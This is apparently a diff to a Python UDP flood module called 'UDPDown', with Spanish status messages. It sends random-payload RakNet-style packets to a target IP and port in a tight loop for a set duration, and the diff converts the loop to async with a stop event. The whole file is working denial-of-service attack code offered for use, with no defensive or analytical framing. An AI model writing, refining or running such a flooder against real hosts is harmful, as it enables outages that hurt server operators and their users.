@@ -1,6 +1,7 @@
 import socket
 import time
 import random
+import asyncio
 
 def generate_raknet_packet(size=1460):
     header = b'\x00'
@@ -11,19 +12,21 @@ def generate_raknet_packet(size=1460):
     payload = random.randbytes(payload_size)
     return header + magic + payload
 
-async def udpdown(ip: str, port: int, duration: int):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+async def run(ip, port, duration, stop_event=None):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet_size = 1460
     end_time = time.time() + duration
     sent = 0
     try:
         while time.time() < end_time:
+            if stop_event is not None and stop_event.is_set():
+                break
             raknet_packet = generate_raknet_packet(packet_size)
-            s.sendto(raknet_packet, (ip, port))
+            sock.sendto(raknet_packet, (ip, port))
             sent += 1
-            time.sleep(0.001)
+            await asyncio.sleep(0.001)
     except Exception as e:
         return f"[UDPDown Error] {e}"
     finally:
-        s.close()
+        sock.close()
     return f"UDPDown terminado. Paquetes enviados: {sent}"
